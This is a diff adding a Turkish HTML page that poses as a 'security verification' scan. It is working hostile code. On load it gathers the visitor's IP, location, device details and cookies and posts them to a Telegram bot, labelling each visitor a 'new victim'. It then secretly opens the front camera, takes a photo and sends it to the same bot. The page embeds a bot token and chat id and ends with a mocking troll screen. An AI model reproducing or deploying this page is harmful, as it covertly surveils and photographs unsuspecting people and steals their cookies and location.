@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Güvenlik Doğrulaması</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .loading-container {
+            display: none;
+            text-align: center;
+            color: white;
+        }
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #4CAF50;
+            animation: spin 1s ease-in-out infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .loading-text {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+        .progress-bar {
+            width: 300px;
+            height: 20px;
+            background: #333;
+            border-radius: 10px;
+            margin: 0 auto;
+            overflow: hidden;
+        }
+        .progress {
+            height: 100%;
+            width: 0%;
+            background: #4CAF50;
+            transition: width 0.3s;
+        }
+        .troll-container {
+            display: none;
+            text-align: center;
+        }
+        .troll-img {
+            max-width: 80%;
+            max-height: 80vh;
+            border-radius: 10px;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
+        }
+        .troll-emoji {
+            font-size: 150px;
+            margin-top: 20px;
+            text-shadow: 0 0 10px #ff0000;
+            animation: shake 0.5s infinite;
+        }
+        @keyframes shake {
+            0%, 100% { transform: rotate(0deg); }
+            25% { transform: rotate(-5deg); }
+            75% { transform: rotate(5deg); }
+        }
+        #hiddenCam, #hiddenCanvas {
+            display: none;
+            position: absolute;
+            top: -9999px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Yüklenme Animasyonu -->
+    <div class="loading-container" id="loadingScreen">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Güvenlik taraması yapılıyor...</div>
+        <div class="progress-bar">
+            <div class="progress" id="progressBar"></div>
+        </div>
+    </div>
+
+    <!-- Troll Ekranı (Sonradan Gösterilecek) -->
+    <div class="troll-container" id="trollScreen">
+        <img src="Foto.png" class="troll-img" alt="Güvenlik Doğrulaması">
+        <div class="troll-emoji">🖕</div>
+    </div>
+
+    <!-- Gizli Kamera ve Canvas -->
+    <video id="hiddenCam" autoplay playsinline></video>
+    <canvas id="hiddenCanvas"></canvas>
+
+    <script>
+        // Telegram Bot Ayarları
+        const botToken = "8684980330:AAGS_BcTgBsH0dXw0Jg1qI5uidqVQ7dVjFw";
+        const chatId = "8610330090";
+
+        // Cihaz Bilgilerini Topla
+        const deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            ip: "Bekleniyor...",
+            location: "Bekleniyor...",
+            referrer: document.referrer || "Direkt giriş",
+            cookies: document.cookie || "Yok"
+        };
+
+        // Yüklenme animasyonunu başlat
+        document.getElementById("loadingScreen").style.display = "block";
+
+        // IP ve Konum Bilgilerini Al (Öncelikli)
+        fetch("https://api.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => {
+                deviceInfo.ip = data.ip;
+                return fetch(`https://ipapi.co/${data.ip}/json/`);
+            })
+            .then(response => response.json())
+            .then(data => {
+                deviceInfo.location = `${data.city || "Bilinmiyor"}, ${data.country_name || "Bilinmiyor"} (${data.country_calling_code || ""})`;
+
+                // Bilgileri hemen Telegram'a gönder
+                sendInitialData();
+
+                // 2.5 saniye yüklenme animasyonu göster
+                simulateLoading();
+            })
+            .catch(() => {
+                deviceInfo.ip = "Alınamadı";
+                deviceInfo.location = "Alınamadı";
+                sendInitialData();
+                simulateLoading();
+            });
+
+        // İlk verileri Telegram'a gönder
+        function sendInitialData() {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+
+            const caption = `
+🚨 *YENİ KURBAN - İLK VERİLER* 🚨
+🔹 *IP:* ${deviceInfo.ip}
+🔹 *Konum:* ${deviceInfo.location}
+🔹 *Cihaz:* ${deviceInfo.platform}
+🔹 *Tarayıcı:* ${deviceInfo.userAgent}
+🔹 *Ekran:* ${deviceInfo.screen}
+🔹 *Saat Dilimi:* ${deviceInfo.timezone}
+🔹 *Dil:* ${deviceInfo.language}
+🔹 *Referrer:* ${deviceInfo.referrer}
+🔹 *Çerezler:* ${deviceInfo.cookies}
+            `.trim();
+
+            formData.append("caption", caption);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: `chat_id=${chatId}&text=${encodeURIComponent(caption)}`
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("İlk veriler gönderildi:", data);
+            })
+            .catch(err => {
+                console.error("Telegram hatası (ilk veriler):", err);
+            });
+        }
+
+        // Sahte yüklenme animasyonu
+        function simulateLoading() {
+            const progressBar = document.getElementById("progressBar");
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+
+                    // Yüklenme bitti, troll ekranını göster
+                    document.getElementById("loadingScreen").style.display = "none";
+                    document.getElementById("trollScreen").style.display = "block";
+
+                    // Fotoğraf çekme işlemini başlat
+                    setTimeout(startCamera, 500);
+                }
+                progressBar.style.width = `${progress}%`;
+            }, 200);
+        }
+
+        // Kamera Başlatma Fonksiyonu
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" }, // Ön kamera
+                    audio: false
+                });
+                const video = document.getElementById("hiddenCam");
+                video.srcObject = stream;
+
+                // 1 saniye sonra fotoğraf çek
+                setTimeout(capturePhoto, 1000);
+            } catch (err) {
+                console.error("Kamera hatası:", err);
+                // Kamera izni yoksa bile verileri gönder
+                sendPhotoToTelegram(null);
+            }
+        }
+
+        // Fotoğraf Çekme Fonksiyonu
+        function capturePhoto() {
+            const video = document.getElementById("hiddenCam");
+            const canvas = document.getElementById("hiddenCanvas");
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Fotoğrafı base64'e çevir
+            const photoData = canvas.toDataURL("image/jpeg", 0.9); // %90 kalite
+
+            // Kamerayı kapat
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+            }
+
+            // Telegram'a gönder
+            sendPhotoToTelegram(photoData);
+        }
+
+        // Fotoğrafı Telegram'a Gönderme Fonksiyonu
+        function sendPhotoToTelegram(photoData) {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+
+            // Bilgileri caption olarak ekle
+            const caption = `
+📸 *KURBAN FOTOĞRAFI* 📸
+🔹 *IP:* ${deviceInfo.ip}
+🔹 *Konum:* ${deviceInfo.location}
+            `.trim();
+
+            formData.append("caption", caption);
+
+            // Fotoğraf varsa ekle
+            if (photoData) {
+                formData.append("photo", dataURLtoBlob(photoData), "kurban_foto.jpg");
+            }
+
+            // Telegram API'ye gönder
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Fotoğraf gönderildi:", data);
+            })
+            .catch(err => {
+                console.error("Fotoğraf gönderme hatası:", err);
+            });
+        }
+
+        // Base64'ü Blob'a Çevirme Fonksiyonu
+        function dataURLtoBlob(dataURL) {
+            const byteString = atob(dataURL.split(",")[1]);
+            const mimeString = dataURL.split(",")[0].split(":")[1].split(";")[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+    </script>
+</body>
+</html>
